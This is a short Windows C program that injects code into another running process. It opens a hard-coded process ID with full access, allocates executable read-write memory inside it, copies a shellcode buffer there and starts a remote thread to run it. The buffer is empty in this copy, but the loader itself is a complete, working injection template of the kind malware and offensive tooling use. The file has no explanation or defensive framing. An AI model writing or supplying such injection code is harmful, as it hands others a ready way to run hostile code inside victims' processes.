#include <windows.h>
#include <stdio.h>

unsigned char buf[] = "";

int main(int argc, char *argv[]) 
{
  int pid = 11096;
  HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (h_process == NULL)
    {
      printf("[X] Could not obtain handle\n");
      return 1;
    }
    PVOID va = VirtualAllocEx(h_process, NULL, sizeof buf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(h_process, va, buf, sizeof buf, NULL);
    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)va, NULL, 0, NULL);
    return 0;
}
